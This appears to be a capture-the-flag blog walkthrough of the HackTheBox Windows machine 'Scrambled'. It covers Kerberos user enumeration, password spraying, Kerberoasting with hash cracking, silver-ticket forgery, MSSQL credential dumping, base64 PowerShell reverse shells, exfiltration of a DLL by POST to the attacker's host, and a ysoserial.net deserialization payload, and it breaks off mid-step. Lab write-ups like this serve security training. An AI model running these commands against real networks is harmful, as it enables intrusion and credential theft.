---
title: "Walk-through of Scrambled from HackTheBox"
header:
  teaser: /assets/images/2022-07-08-17-11-42.png
toc: true
toc_sticky: true
excerpt_separator:  <!--more-->
categories:
  - CTF
tags:
  - HTB
  - CTF
  - Windows
  - Kerbrute
  - Impacket-GetTGT
  - Impacket-SMBClient
  - Impacket-GetUserSPNs
  - Impacket-SecretsDump
  - Impacket-Ticketer
  - Impacket-MSSQLClient
  - JohnTheRipper 
  - YSoSerial 
---

[Scrambled](https://www.hackthebox.com/home/machines/profile/476) is a medium level machine by [VbScrub](https://www.hackthebox.com/home/users/profile/158833) on [HackTheBox](https://www.hackthebox.com/home). It's A Windows box that focuses on using different Impacket scripts to progress.

<!--more-->

## Machine Information

![scrambled](/assets/images/2022-07-08-17-11-42.png)

We start with website recon which leads us to brute forcing Kerberos to find valid user accounts. With credentials we gain access to SMB shares, and retrieve the hash of a service principal for a SQL account. Cracking that lets us dump another accounts credentials from SQL, and we gain our first shell on the box. We migrate to another user and grab a DLL that reveals how the Sales Order App works. From there we use a deserialization exploit to get a shell as NT System.

| Details |  |
| --- | --- |
| Hosting Site | [HackTheBox](https://www.hackthebox.eu) |
| Link To Machine | [HTB - Medium - Scrambled](https://www.hackthebox.com/home/machines/profile/476) |
| Machine Release Date | 11th June 2022 |
| Date I Completed It |  July 2022 |
| Distribution Used | Kali 2022.1 – [Release Info](https://www.kali.org/blog/kali-linux-2022-1-release/) |

## Initial Recon

As always let's start with Nmap:

```sh
┌──(root㉿kali)-[~/htb/scrambled]
└─# ports=$(nmap -p- --min-rate=1000 -T4 10.10.11.168 | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//) 

┌──(root㉿kali)-[~/htb/scrambled]
└─# nmap -p$ports -sC -sV -oA scrambled 10.10.11.168
Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-08 17:17 BST
Nmap scan report for 10.10.11.168
Host is up (0.028s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-07-08 16:17:27Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: scrm.local0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: scrm.local0., Site: Default-First-Site-Name)
1433/tcp  open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: scrm.local0., Site: Default-First-Site-Name)
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: scrm.local0., Site: Default-First-Site-Name)
4411/tcp  open  found?
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, GenericLines, JavaRMI, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, NCP, NULL, NotesRPC, RPCCheck, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, WMSRequest, X11Probe, afp, giop, ms-sql-s, oracle-tns: 
|     SCRAMBLECORP_ORDERS_V1.0.3;
|   FourOhFourRequest, GetRequest, HTTPOptions, Help, LPDString, RTSPRequest, SIPOptions: 
|     SCRAMBLECORP_ORDERS_V1.0.3;
|_    ERROR_UNKNOWN_COMMAND;
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc         Microsoft Windows RPC
49700/tcp open  msrpc         Microsoft Windows RPC
49704/tcp open  msrpc         Microsoft Windows RPC
51550/tcp open  msrpc         Microsoft Windows RPC
```

It's a Windows box so a lot of open ports. One that stands out is 4411 with some sort of custom application running on it:

```sh
┌──(root㉿kali)-[~/htb/scrambled]
└─# nc -v scrm.local 4411
scrm.local [10.10.11.168] 4411 (?) open
SCRAMBLECORP_ORDERS_V1.0.3;
help
ERROR_UNKNOWN_COMMAND;
LOGON
ERROR_INVALID_CREDENTIALS;
```

## Website Review

For now we don't know what to do here so let's look at the website on port 80:

![scrambled-website](/assets/images/2022-07-08-17-27-31.png)

There's not a lot of content on the site, this is an interesting message on the IT Services page:

![scrambled-itservices](/assets/images/2022-07-08-17-28-29.png)

Suggests we have a Windows box with no NTLM so we'll be looking at Kerberos instead.

There's a link to a page for contacting IT support:

![scrambled-contactit](/assets/images/2022-07-10-21-45-35.png)

This shows us that us a potential username of ksimpson.

There's a link to a page where you can report a problem with the sales app:

![scrambled-salesapp](/assets/images/2022-07-08-17-30-51.png)

It tells us to enable debug logging which uses port 4411:

![scrambled-enabledebug](/assets/images/2022-07-08-17-31-59.png)

We now have a clue as to what port 4411 is for. Also there's a link to a page to request a password reset:

![scrambled-passwordreset](/assets/images/2022-07-08-17-33-10.png)

Another clue that a password reset will mean the password is the same as your username.

## Kerbrute

We can use [Kerbrute](https://github.com/ropnop/kerbrute) to do a Kerberos brute force attack, which we covered in the TryHackMe room [Attacktive](https://pencer.io/ctf/ctf-thm-attacktive/#task-4---kerbrute) a while ago.

Let's get the latest version of Kerbrute:

```sh
┌──(root㉿kali)-[~/htb/scrambled]
└─# wget https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_linux_amd64
--2022-07-08 17:51:19--  https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_linux_amd64
Resolving github.com (github.com)... 140.82.121.3
Connecting to github.com (github.com)|140.82.121.3|:443... connected.
HTTP request sent, awaiting response... 302 Found
<SNIP>
Connecting to objects.githubusercontent.com (objects.githubusercontent.com)|185.199.111.133|:443 connected.
HTTP request sent, awaiting response... 200 OK
Length: 8286607 (7.9M) [application/octet-stream]
Saving to: ‘kerbrute_linux_amd64’
kerbrute_linux_amd64     100%[=============================>]   7.90M  5.58MB/s    in 1.4s    
2022-07-08 17:51:21 (5.58 MB/s) - ‘kerbrute_linux_amd64’ saved [8286607/8286607]

┌──(root㉿kali)-[~/htb/scrambled]
└─# chmod +x kerbrute_linux_amd64 
```

We also need a list of usernames to try, [this](https://github.com/attackdebris/kerberos_enum_userlists) is a good repo with lots of options:

```sh
┌──(root㉿kali)-[~/htb/scrambled]
└─# git clone https://github.com/attackdebris/kerberos_enum_userlists.git
Cloning into 'kerberos_enum_userlists'...
remote: Enumerating objects: 57, done.
remote: Total 57 (delta 0), reused 0 (delta 0), pack-reused 57
Receiving objects: 100% (57/57), 266.28 KiB | 1.55 MiB/s, done.
Resolving deltas: 100% (37/37), done.
 ```

There's lots of good guides out there on Windows user enumeration, [this](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology#user-enumeration) from HackTricks shows us Kerbrute among others. Also [this](https://www.tarlogic.com/blog/how-to-attack-kerberos/) is a really good article with lots of examples.

First we need to add the DC to our hosts file:

```sh
┌──(root㉿kali)-[~/htb/scrambled]
└─# echo "10.10.11.168 scrm.local dc1.scrm.local" >> /etc/hosts
```

## User Enumeration

Now let's do it:

```sh
┌──(root㉿kali)-[~/htb/scrambled]
└─# ./kerbrute_linux_amd64 userenum -d scrm.local --dc scrm.local kerberos_enum_userlists/A-ZSurnames.txt -t 100 -o kerb-user.txt
    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        
Version: v1.0.3 (9dad6e1) - 07/08/22 - Ronnie Flathers @ropnop

2022/07/08 17:47:26 >  Using KDC(s):
2022/07/08 17:47:26 >   scrm.local:88

2022/07/08 17:47:26 >  [+] VALID USERNAME:       ASMITH@scrm.local
2022/07/08 17:47:27 >  [+] VALID USERNAME:       JHALL@scrm.local
2022/07/08 17:47:27 >  [+] VALID USERNAME:       KSIMPSON@scrm.local
2022/07/08 17:47:27 >  [+] VALID USERNAME:       KHICKS@scrm.local
2022/07/08 17:47:29 >  [+] VALID USERNAME:       SJENKINS@scrm.local
2022/07/08 17:47:34 >  Done! Tested 13000 usernames (5 valid) in 7.847 seconds
```

We've got a few hits. Let's make a useable list:

```sh
┌──(root㉿kali)-[~/htb/scrambled]
└─# cat kerb-user.txt | tail -n +3 | cut -d ' ' -f 8 | head -n -1 > users.txt

┌──(root㉿kali)-[~/htb/scrambled]
└─# cat users.txt
ASMITH@scrm.local
JHALL@scrm.local
KSIMPSON@scrm.local
KHICKS@scrm.local
SJENKINS@scrm.local
```

## Password Spray

Now we can use a password spray against them, knowing that the password is the same as the username I get this when I try ksimpson:

```sh
┌──(root㉿kali)-[~/htb/scrambled]
└─# ./kerbrute_linux_amd64 passwordspray -d scrm.local --dc scrm.local user.txt ksimpson 
    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        
Version: v1.0.3 (9dad6e1) - 07/08/22 - Ronnie Flathers @ropnop

2022/07/08 17:53:11 >  Using KDC(s):
2022/07/08 17:53:11 >   scrm.local:88
2022/07/08 17:53:11 >  [+] VALID LOGIN:  KSIMPSON@scrm.local:ksimpson
2022/07/08 17:53:11 >  Done! Tested 1 logins (1 successes) in 0.116 seconds
```

## Get Ticket Granting Ticket

With a valid username and password we can request a ticket:

```sh
┌──(root㉿kali)-[~/htb/scrambled]
└─# impacket-getTGT scrm.local/ksimpson:ksimpson
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation
[*] Saving ticket in ksimpson.ccache

┌──(root㉿kali)-[~/htb/scrambled]
└─# export KRB5CCNAME=ksimpson.ccache
```

## SMB Enumeration

We can use this to look for file shares on SMB:

```sh
┌──(root㉿kali)-[~/htb/scrambled]
└─# impacket-smbclient -k -no-pass scrm.local/ksimpson@dc1.scrm.local
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation
# shares
ADMIN$
C$
HR
IPC$
IT
NETLOGON
Public
Sales
SYSVOL

# use Public
# ls
drw-rw-rw-          0  Thu Nov  4 22:23:19 2021 .
drw-rw-rw-          0  Thu Nov  4 22:23:19 2021 ..
-rw-rw-rw-     630106  Fri Nov  5 17:45:07 2021 Network Security Changes.pdf

# get Network Security Changes.pdf
# exit
```

Above we found a number of file shares but only the Public one was accessible. Let's look at the file we grabbed:

![scrambled-securitymeasures](/assets/images/2022-07-10-22-43-29.png)

## Get User SPN

A few more clues. The key one here is that only administrators have access to SQL. Let's get the service principal names (SPNs):

```sh
┌──(root㉿kali)-[~/htb/scrambled]
└─# impacket-GetUserSPNs scrm.local/ksimpson -request -k -no-pass
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

[-] exceptions must derive from BaseException
```

This had me stuck for a while, but some searching found [this](https://github.com/SecureAuthCorp/impacket/issues/1206) issue raised by the box author! He kindly gives us a workaround. So grab the GetUserSPNs.py file from the Impacket repo:

```sh
┌──(root㉿kali)-[~/htb/scrambled]
└─# wget https://raw.githubusercontent.com/SecureAuthCorp/impacket/master/examples/GetUserSPNs.py
--2022-07-08 18:18:54--  https://raw.githubusercontent.com/SecureAuthCorp/impacket/master/examples/GetUserSPNs.py
Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.108.133, 185.199.111.133, 
Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.108.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 24390 (24K) [text/plain]
Saving to: ‘GetUserSPNs.py’
GetUserSPNs.py            100%[===================================>]  23.82K  --.-KB/s    in 0.008s  
2022-07-08 18:18:54 (2.96 MB/s) - ‘GetUserSPNs.py’ saved [24390/24390]
```

Edit the line as described:

```python
def run(self):
        if self.__usersFile:
            self.request_users_file_TGSs()
            return

        if self.__doKerberos:
           target = self.__kdcHost
           #target = self.getMachineName()  <-- old line 260 code that we're no longer running
        else:
            if self.__kdcHost is not None and self.__targetDomain == self.__domain:
                target = self.__kdcHost
            else:
                target = self.__targetDomain
```

Now run that version of the script:

```sh
┌──(root㉿kali)-[~/htb/scrambled]
└─# python3 GetUserSPNs.py -dc-ip dc1.scrm.local scrm.local/ksimpson -request -k -no-pass
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

ServicePrincipalName          Name    MemberOf  PasswordLastSet             LastLogon                   Delegation 
----------------------------  ------  --------  --------------------------  --------------------------  ----------
MSSQLSvc/dc1.scrm.local:1433  sqlsvc            2021-11-03 16:32:02.351452  2022-07-10 20:11:44.221570             
MSSQLSvc/dc1.scrm.local       sqlsvc            2021-11-03 16:32:02.351452  2022-07-10 20:11:44.221570             

[-] type object 'CCache' has no attribute 'parseFile'
```

This error took more searching, eventually finding [this](https://github.com/SecureAuthCorp/impacket/issues/1328) issue which tells us the version of Impacket that is installed on Kali is out of date. So we need to update that first:

```sh
┌──(root㉿kali)-[~/htb/scrambled/impacket]
└─# python3 -m pip install .
Processing /root/htb/scrambled/impacket
  Preparing metadata (setup.py) ... done
Requirement already satisfied: chardet in /usr/lib/python3/dist-packages (from impacket==0.10.1.dev1+20220708.213759.8b1a99f7) (4.0.0)
Collecting dsinternals
  Downloading dsinternals-1.2.4.tar.gz (174 kB)
     ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 174.2/174.2 kB 1.9 MB/s eta 0:00:00
  Preparing metadata (setup.py) ... done
<SNIP>
Successfully built impacket dsinternals
Installing collected packages: dsinternals, impacket
  Attempting uninstall: impacket
    Found existing installation: impacket 0.9.24
    Uninstalling impacket-0.9.24:
      Successfully uninstalled impacket-0.9.24
```

Finally we can run again to get our hash:

```sh
┌──(root㉿kali)-[~/htb/scrambled]
└─# python3 GetUserSPNs.py -dc-ip dc1.scrm.local scrm.local/ksimpson -request -k -no-pass
Impacket v0.10.1.dev1+20220708.213759.8b1a99f7 - Copyright 2022 SecureAuth Corporation

ServicePrincipalName          Name    MemberOf  PasswordLastSet             LastLogon                   Delegation 
----------------------------  ------  --------  --------------------------  --------------------------  ----------
MSSQLSvc/dc1.scrm.local:1433  sqlsvc            2021-11-03 16:32:02.351452  2022-07-10 20:11:44.221570             
MSSQLSvc/dc1.scrm.local       sqlsvc            2021-11-03 16:32:02.351452  2022-07-10 20:11:44.221570             

$krb5tgs$23$*sqlsvc$SCRM.LOCAL$scrm.local/sqlsvc*$bb8f4319a7e559125e94d7518b9a1eb6$b917eb19722e7da2837ef7f1ab984f
05700ee81bd1e6855e2fdf62539f49f26aa1544496a3967c95304e65974cebd8170e1cf5ab15acd7a5dbb18f956286240ab0c0e8674b30e30
<SNIP>
```

## John The Ripper

Put that hash in a text file and use JohnTheRipper to crack it:

```sh
┌──(root㉿kali)-[~/htb/scrambled]
└─# john sqlsvc.hash -w=/usr/share/wordlists/rockyou.txt                         

Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Pegasus60        (?)     
1g 0:00:00:45 DONE (2022-07-10 21:35) 0.02175g/s 233401p/s 233401c/s 233401C/s Penrose..Pearce
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

## Secrets Dump

Now we have an account called sqlsvc with a password of Pegasus60. Next we need to get the SID of the administrator account, we can use secretsdump:

```sh
┌──(root㉿kali)-[~/htb/scrambled]
└─# impacket-secretsdump -k scrm.local/ksimpson@dc1.scrm.local -no-pass
Impacket v0.10.1.dev1+20220708.213759.8b1a99f7 - Copyright 2022 SecureAuth Corporation

[-] Policy SPN target name validation might be restricting full DRSUAPI dump. Try -just-dc-user
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
[-] DRSR SessionError: code: 0x20f7 - ERROR_DS_DRA_BAD_DN - The distinguished name specified for this replication operation is invalid.
[*] Something went wrong with the DRSUAPI approach. Try again with -use-vss parameter
[*] Cleaning up...
```

This didn't work like normal, probably for a similar reason as the other script. A search for [this](https://github.com/SecureAuthCorp/impacket/issues/991) issue which says to add debug:

```sh
┌──(root㉿kali)-[~/htb/scrambled]
└─# impacket-secretsdump -k scrm.local/ksimpson@dc1.scrm.local -no-pass -debug 
Impacket v0.10.1.dev1+20220708.213759.8b1a99f7 - Copyright 2022 SecureAuth Corporation

[+] Impacket Library Installation Path: /usr/local/lib/python3.10/dist-packages/impacket
[+] Using Kerberos Cache: ksimpson.ccache
[+] SPN CIFS/DC1.SCRM.LOCAL@SCRM.LOCAL not found in cache
[+] AnySPN is True, looking for another suitable SPN
[+] Returning cached credential for KRBTGT/SCRM.LOCAL@SCRM.LOCAL
[+] Using TGT from cache
[+] Trying to connect to KDC at SCRM.LOCAL
[-] Policy SPN target name validation might be restricting full DRSUAPI dump. Try -just-dc-user
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
[+] Session resume file will be sessionresume_jLiLWMcH
[+] Trying to connect to KDC at SCRM.LOCAL
[+] Calling DRSCrackNames for S-1-5-21-2743207045-1827831105-2542523200-500 
[+] Calling DRSGetNCChanges for {edaf791f-e75b-4711-8232-3cd66840032a} 
<SNIP>
impacket.dcerpc.v5.drsuapi.DCERPCSessionError: DRSR SessionError: code: 0x20f7 - ERROR_DS_DRA_BAD_DN - The distinguished name specified for this replication operation is invalid.
[-] DRSR SessionError: code: 0x20f7 - ERROR_DS_DRA_BAD_DN - The distinguished name specified for this replication operation is invalid.
[*] Something went wrong with the DRSUAPI approach. Try again with -use-vss parameter
[*] Cleaning up...
```

We see the SID of **S-1-5-21-2743207045-1827831105-2542523200-500** has been retrieved even though there is still the error. It ends in 500 so we know this is the administrator SID.

## SQL Admin Hash

Next we need an NTLM hash of the sqlsrv account password we found earlier:

```sh
┌──(root㉿kali)-[~/htb/scrambled]
└─# iconv -f ASCII -t UTF-16LE <(printf "Pegasus60") | openssl dgst -md4
(stdin)= b999a16500b87d17ec7f2e2a68778f05
```

## Silver Ticket

We have enough information to create a silver ticket. [This](https://en.hackndo.com/kerberos-silver-golden-tickets/) is a good article that explains what silver and golden tickets are if you're interested in learning more.

Let's use Impacket's ticketer:

```sh
┌──(root㉿kali)-[~/htb/scrambled]
└─# impacket-ticketer -nthash b999a16500b87d17ec7f2e2a68778f05 -domain-sid S-1-5-21-2743207045-1827831105-2542523200 -domain scrm.local -spn MSSQLSvc/dc1.scrm.local -user-id 500 Administrator
Impacket v0.10.1.dev1+20220708.213759.8b1a99f7 - Copyright 2022 SecureAuth Corporation

[*] Creating basic skeleton ticket and PAC Infos
[*] Customizing ticket for scrm.local/Administrator
[*]     PAC_LOGON_INFO
[*]     PAC_CLIENT_INFO_TYPE
[*]     EncTicketPart
[*]     EncTGSRepPart
[*] Signing/Encrypting final ticket
[*]     PAC_SERVER_CHECKSUM
[*]     PAC_PRIVSVR_CHECKSUM
[*]     EncTicketPart
[*]     EncTGSRepPart
[*] Saving ticket in Administrator.ccache

┌──(root㉿kali)-[~/htb/scrambled]
└─# export KRB5CCNAME=Administrator.ccache
```

## MS SQL Client

Here we've created a silver ticket which we can use to impersonate the administrator account. Now we can use the Impacket MSSQLClient script to connect to MSSQL using our Kerberos ticket:

```sh
┌──(root㉿kali)-[~/htb/scrambled]
└─# mssqlclient.py dc1.scrm.local -k
Impacket v0.10.1.dev1+20220708.213759.8b1a99f7 - Copyright 2022 SecureAuth Corporation

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC1): Line 1: Changed database context to 'master'.
[*] INFO(DC1): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) 
[!] Press help for extra shell commands
SQL> 
```

Let's look through the databases and tables for loot:

```sh
SQL> SELECT name, database_id, create_date from SYS.DATABASES
name               database_id   create_date
----------------   -----------   -----------
master             1             2003-04-08 09:13:36
tempdb             2             2022-07-11 00:03:29
model              3             2003-04-08 09:13:36
msdb               4             2019-09-24 14:21:42
ScrambleHR         5             2021-11-03 17:46:55

SQL> select table_name from ScrambleHR.INFORMATION_SCHEMA.TABLES
table_name
----------
Employees
UserImport
Timesheets

SQL> select ldapuser,ldappwd from userimport
ldapuser          ldappwd
---------------   ---------------------
MiscSvc           ScrambledEggs9900
```

We have another account and password.

## XP CMD Shell

Next we can test if [xp_cmdshell](https://docs.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql?view=sql-server-ver16) is enabled:

```sh
SQL> xp_cmdshell net user
User accounts for \\DC1                                                            
------------------------------------------------------------
administrator            asmith                   backupsvc
ehooker                  Guest                    jhall
khicks                   krbtgt                   ksimpson
miscsvc                  rsmith                   sdonington
sjenkins                 sqlsvc                   tstar
```

## PowerShell Reverse Shell

Of course we knew it would be! Time for a reverse shell, I used [this](https://gist.githubusercontent.com/tothi/ab288fb523a4b32b51a53e542d40fe58/raw/40ade3fb5e3665b82310c08d36597123c2e75ab4/mkpsrevshell.py) script to generate a base64 encoded one to avoid any problems:

```sh
┌──(root㉿kali)-[~/htb/scrambled]
└─# wget https://gist.githubusercontent.com/tothi/ab288fb523a4b32b51a53e542d40fe58/raw/40ade3fb5e3665b82310c08d36597123c2e75ab4/mkpsrevshell.py
--2022-07-11 22:01:39--  https://gist.githubusercontent.com/tothi/ab288fb523a4b32b51a53e542d40fe58/raw/40ade3fb5e3665b82310c08d36597123c2e75ab4/mkpsrevshell.py
Resolving gist.githubusercontent.com (gist.githubusercontent.com)... 185.199.108.133, 185.199.111.133, 185.199.110.133, ...
Connecting to gist.githubusercontent.com (gist.githubusercontent.com)|185.199.108.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 1107 (1.1K) [text/plain]
Saving to: ‘mkpsrevshell.py’
mkpsrevshell.py    100%[============================================>]   1.08K  --.-KB/s    in 0s      
2022-07-11 22:01:40 (129 MB/s) - ‘mkpsrevshell.py’ saved [1107/1107]

┌──(root㉿kali)-[~/htb/scrambled]
└─# python3 mkpsrevshell.py 10.10.14.198 1337
powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8<SNIP>
```

Start netcat listening then switch to the mssql session and paste this in with xp_cmdshell:

```sh
SQL> xp_cmdshell powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHM<SNIP>
```

## Shell As SQLSVC

Switch back to Kali to see we're connected:

```sh
┌──(root㉿kali)-[~/htb/scrambled]
└─# nc -nlvp 1337
listening on [any] 1337 ...
connect to [10.10.14.198] from (UNKNOWN) [10.10.11.168] 56490
whoami
scrm\sqlsvc
PS C:\Windows\system32> 
```

We are only a low level service account, but we have credentials for another user from the MSSQL database. Let's start another shell and switch to that user.

First start another netcat listening in a different terminal:

```sh
┌──(root㉿kali)-[~/htb/scrambled]
└─# nc -nlvp 1338
listening on [any] 1338 ...
```

Use the Python sctipt to create another base64 Powershell reverse shell, this time I've used port 1338 instead of 1337 which is still in use:

```sh
──(root㉿kali)-[~/htb/scrambled]
└─# python3 ps_revshell.py 10.10.14.198 1338                           
powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGU<SNIP>
```

## Shell As MiscSvc

Switch to our current shell on the box and create a PS object with the new users credentials:

```powershell
PS C:\Windows\system32> $MiscSvcPassword = ConvertTo-SecureString 'ScrambledEggs9900' -AsPlainText -Force
PS C:\Windows\system32> $Cred = New-Object System.Management.Automation.PSCredential('Scrm\MiscSvc', $MiscSvcPassword)
PS C:\Windows\system32> Invoke-Command -Computer dc1 -ScriptBlock { powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE<SNIP>EMAbABvAHMAZQAoACkA } -Credential $Cred
```

Now switch to our other netcat listening on port 1338 to see we're connected as the miscsvc user:

```sh
┌──(root㉿kali)-[~/htb/scrambled]
└─# nc -nlvp 1338      
listening on [any] 1338 ...
connect to [10.10.14.198] from (UNKNOWN) [10.10.11.168] 56480
whoami
scrm\miscsvc
PS C:\Users\miscsvc\Documents>
```

## User Flag

Let's get the user flag before we move on:

```powershell
PS C:\Users\miscsvc\Documents> type ../desktop/user.txt
2be5fe50f02a0b315c9673e304702ff4
```

After a bit of looking around I found this:

```powershell
PS C:\> dir "Shares\IT\Apps\Sales Order Client"
    Directory: C:\Shares\IT\Apps\Sales Order Client
Mode                LastWriteTime         Length Name                                              
----                -------------         ------ ----                                              
-a----       05/11/2021     20:52          86528 ScrambleClient.exe                                
-a----       05/11/2021     20:52          19456 ScrambleLib.dll 
```

Right back at the start we found the Sales order app was running on port 4411. Here we have found the executable and dll used on the server side. Let's exfiltrate and have a look back on Kali. I used [this](https://codebeta.com/data-exfiltration-uploading-from-powershell) method using PowerShell.

## Data Exfiltration

Start netcat listenting and redirect the recieved data to a file:

```sh
┌──(root㉿kali)-[~/htb/scrambled]
└─# nc -l -p 80 > ScrambleLib.b64 
```

On the box send the DLL file over to Kali:

```powershell
Invoke-WebRequest -uri http://10.10.14.198/exfil.data -Method POST -Body ([System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes("C:\shares\it\apps\sales order client\ScrambleLib.dll")))
```

Switch back to Kali, ctrl-c the netcat listener then decode the file from base64:

```sh
┌──(root㉿kali)-[~/htb/scrambled]
└─# tail -1 ScrambleLib.b64 | base64 -d > ScrambleLib.dll

┌──(root㉿kali)-[~/htb/scrambled]
└─# file ScrambleLib.dll 
ScrambleLib.dll: PE32 executable (DLL) (console) Intel 80386 Mono/.Net assembly, for MS Windows
```

We can use strings to look at the readable contents of the file:

```sh
┌──(root㉿kali)-[~/htb/scrambled]
└─# strings -el -n8 ScrambleLib.dll 
```

Even filtering for 8 characters or longer the output is quite long. These bits are interesting:

```text
LIST_ORDERS
UPLOAD_ORDER

Getting orders from server
Splitting and parsing sales orders
sales orders in server response
Deserializing single sales order from base64: 
Deserialization successful
Finished deserializing all sales orders
Uploading new order with reference 
Order serialized to base64: 
Upload successful
```

We see what looks like two commands **LIST_ORDERS** and **UPLOAD_ORDER** and then there's lots of messages about serializing and deserializing orders.

## YSoSerial

I did a HackTheBox machine a while back called [LogForge](https://pencer.io/ctf/ctf-htb-logforge/#java-de-serialization-attacks) that focused on Log4J attacks. In that we covered object serialization using [YSoSerial](https://github.com/frohoff/ysoserial). HackTricks has some good info [here](https://book.hacktricks.xyz/pentesting-web/deserialization) for the deserialization attack we want to perform. Also [this](https://speakerdeck.com/pwntester/attacking-net-serialization) is a presentation by the creator of this Windows version which is an interesting read. Finally [this](https://security.stackexchange.com/questions/256086/how-to-decode-ysoserial-net-payload) was what gave me the idea on what parameters we need to use for Windows.

Grab the Windows version of YSoSerial from [here](https://github.com/pwntester/ysoserial.net/releases/download/v1.34/ysoserial-1.34.zip). Unzip and then let's test a payload by doing a simple ping just like we did on [LogForge](https://pencer.io/ctf/ctf-htb-logforge/#java-de-serialization-attacks):

```powershell
PS C:\Users\Downloads\ysoserial-1.34\Release> ./ysoserial.exe -f BinaryFormatter -g WindowsIdentity -o base64 -c "ping -n 2 10.10.14.198"
AAEAAAD/////AQAAAAAAAAAEAQAAAClTeXN0ZW0uU2Vj <SNIP> 05MmFXUmxjajRMCw==
```

Take the long serialized object that's been base64 encoded and switch to Kali where we can connect to port 4411 again and upload it:

```sh
┌──(root㉿kali)-[~/htb/scrambled]
└─# nc -v scrm.local 4411
scrm.local [10.10.11.168] 4411 (?) open
SCRAMBLECORP_ORDERS_V1.0.3;
UPLOAD_ORDER;AAEAAAD/////AQAAAAAAAAAEAQAAAClTeXN0ZW0uU2Vj <SNIP> 05MmFXUmxjajRMCw==
ERROR_GENERAL;Error deserializing sales order: Exception has been thrown by the target of an invocation.
```

I've used the **UPLOAD_ORDER** command we saw when looking with Strings, then semicolon, then pasted my YoSoSerial payload. Switch to a waiting tcpdump to see our ping:

```sh
┌──(root㉿kali)-[~/htb/scrambled]
└─# tcpdump -ni tun0 icmp
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
22:32:01.688887 IP 10.10.11.168 > 10.10.14.198: ICMP echo request, id 1, seq 1, length 40
22:32:01.688905 IP 10.10.14.198 > 10.10.11.168: ICMP echo reply, id 1, seq 1, length 40
22:32:02.697397 IP 10.10.11.168 > 10.10.14.198: ICMP echo request, id 1, seq 2, length 40
22:32:02.697411 IP 10.10.14.198 > 10.10.11.168: ICMP echo reply, id 1, seq 2, length 40
```

That worked as expected, so now we can do a reverse shell. I tried using the same base64 encoded PowerShell one we used earlier:

```powershell
PS C:\Users\Downloads\ysoserial-1.34\Release> ./ysoserial.exe -f BinaryFormatter -g WindowsIdentity -o base64 -c "powershell -e JABjAGwAaQBlA <SNIP> AZQAoACkA"
```

I couldn't get it working so back to HackTricks and I used the first one [here](https://book.hacktricks.xyz/windows-hardening/basic-powershell-for-pentesters#download-and-execute). Which is put our base64 encoded reverse shell from earlier in to a file and then pull that over to the box.

On Kali:

```sh
┌──(root㉿kali)-[~/htb/scrambled]
